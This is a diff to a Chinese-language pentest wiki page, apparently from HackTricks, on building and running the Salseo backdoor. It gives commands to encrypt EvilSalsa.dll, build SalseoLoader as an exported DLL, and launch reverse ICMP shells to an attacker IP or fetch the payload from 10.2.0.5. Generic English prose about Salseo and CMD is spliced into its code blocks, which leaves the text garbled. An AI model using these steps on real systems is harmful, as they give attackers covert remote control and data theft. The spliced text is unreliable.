@@ -30,7 +30,7 @@
 
 ## 准备后门
 
-首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**：
+首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**来进行编码：
 
 ### **Python**
 ```
@@ -45,13 +45,13 @@ The Salseo backdoor is a type of malware that provides unauthorized access to a 
 
 ##### Functionality
 
-Once installed on a target system, the Salseo backdoor establishes a covert communication channel with a remote command and control (C2) server. This allows the attacker to remotely execute commands on the compromised system and retrieve sensitive information.
+Once installed on a target system, the Salseo backdoor establishes a covert communication channel with a remote command and control (C2) server. This allows the attacker to remotely execute commands on the compromised machine and retrieve sensitive information.
 
 The backdoor is capable of performing various malicious activities, including:
 
 1. **Remote Access**: The attacker can gain full control over the infected system, enabling them to perform actions as if they were physically present.
 
-2. **Data Exfiltration**: The backdoor can steal sensitive data from the compromised system, such as login credentials, financial information, or intellectual property.
+2. **Data Exfiltration**: The backdoor can steal sensitive data from the compromised machine, such as login credentials, financial information, or intellectual property.
 
 3. **Keylogging**: Salseo can capture keystrokes, allowing the attacker to monitor and record user activities, including passwords and other confidential information.
 
@@ -69,25 +69,23 @@ The Salseo backdoor can be delivered through various infection vectors, includin
 
 3. **Exploit Kits**: Salseo can be delivered through exploit kits that target vulnerabilities in outdated software or plugins, allowing the attacker to gain unauthorized access.
 
-4. **Malicious Downloads**: Downloading and executing files from untrusted sources can result in the installation of the backdoor.
+4. **Malicious Downloads**: Users may unknowingly download and execute the backdoor when interacting with malicious files or software from untrusted sources.
 
 ##### Detection and Prevention
 
-To detect and prevent the Salseo backdoor, it is recommended to:
+Detecting and preventing the Salseo backdoor requires a multi-layered approach, including:
 
-1. **Keep Software Updated**: Regularly update operating systems, applications, and plugins to patch known vulnerabilities.
+1. **Antivirus Software**: Regularly update and use reputable antivirus software to detect and remove known malware signatures associated with Salseo.
 
-2. **Use Antivirus Software**: Employ reputable antivirus software that can detect and remove malware, including backdoors.
+2. **Patch Management**: Keep operating systems, software, and plugins up to date to mitigate vulnerabilities that could be exploited by the backdoor.
 
-3. **Exercise Caution with Email Attachments and Links**: Be cautious when opening email attachments or clicking on links, especially if they are unexpected or from unknown senders.
+3. **User Education**: Train users to recognize and avoid phishing emails, suspicious websites, and downloads from untrusted sources.
 
-4. **Enable Firewall and Intrusion Detection Systems**: Configure firewalls and intrusion detection systems to monitor and block suspicious network traffic.
+4. **Network Monitoring**: Implement network monitoring tools to detect unusual traffic patterns or connections to known malicious C2 servers.
 
-5. **Implement Least Privilege**: Limit user privileges to minimize the impact of a potential compromise.
+5. **Firewall Configuration**: Configure firewalls to block unauthorized inbound and outbound connections, limiting the backdoor's ability to communicate with the C2 server.
 
-6. **Perform Regular Security Audits**: Conduct periodic security audits to identify and address any vulnerabilities in the system.
-
-By following these best practices, you can enhance the security of your Windows systems and reduce the risk of falling victim to the Salseo backdoor.
+By implementing these preventive measures and maintaining a proactive security posture, organizations can reduce the risk of falling victim to the Salseo backdoor and other similar malware.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -147,59 +145,57 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 使用Visual Studio打开SalseoLoader项目。
 
-### 在主函数之前添加：\[DllExport]
+在主函数之前添加\[DllExport]。
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### 为该项目安装DllExport
+为该项目安装DllExport。
 
-#### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
+选择**工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **搜索DllExport包（使用浏览选项卡），然后点击安装（并接受弹出窗口）**
+在浏览选项卡中搜索DllExport程序包，并点击安装（接受弹出窗口）。
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
-在项目文件夹中会出现以下文件：**DllExport.bat**和**DllExport\_Configure.bat**
+在项目文件夹中会出现**DllExport.bat**和**DllExport_Configure.bat**文件。
 
-### **卸载** DllExport
+卸载DllExport。
 
-点击**卸载**（是的，很奇怪，但相信我，这是必要的）
+点击**卸载**（是的，很奇怪，但相信我，这是必要的）。
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-### **退出Visual Studio并执行DllExport\_configure**
+退出Visual Studio并执行DllExport_Configure。
 
-只需**退出**Visual Studio
+只需退出Visual Studio，然后转到您的SalseoLoader文件夹并执行DllExport_Configure.bat。
 
-然后，转到**SalseoLoader文件夹**并**执行DllExport\_Configure.bat**
-
-选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**
+选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**。
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
-### **再次使用Visual Studio打开项目**
+再次使用Visual Studio打开项目。
 
-**\[DllExport]**不再被标记为错误
+\[DllExport]不再标记为错误。
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
-### 构建解决方案
+构建解决方案。
 
-选择**输出类型 = 类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型 = 类库）
+选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）。
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标 = x64）
+选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）。
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-要**构建**解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）
+构建解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）。
 
-### 测试生成的DLL
+测试生成的DLL
 
-将DLL复制并粘贴到要进行测试的位置。
+将DLL复制粘贴到要进行测试的位置。
 
 执行：
 ```
@@ -224,15 +220,11 @@ rundll32.exe SalseoLoader.dll,main
 
 CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
 
-To exploit CMD, hackers often use backdoors to gain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system is patched or the user's password is changed.
+To access CMD, simply open the Start menu, type "cmd" in the search bar, and press Enter. This will open the Command Prompt window, where you can start executing commands.
 
-There are several methods to create a backdoor in CMD. One common technique is to modify the system's registry to execute a malicious script every time the system starts up. Another method is to create a scheduled task that runs a backdoor script at specific intervals.
-
-Once a backdoor is installed, hackers can use CMD to remotely control the compromised system. They can execute commands, upload and download files, and manipulate system settings. CMD provides a convenient interface for hackers to interact with the target system and carry out their malicious activities.
-
-To protect against CMD-based attacks, it is important to regularly update the operating system and security software. Additionally, monitoring network traffic and implementing strong access controls can help detect and prevent unauthorized access to CMD.
+It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical. Always ensure that you have proper authorization before using CMD on a system.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
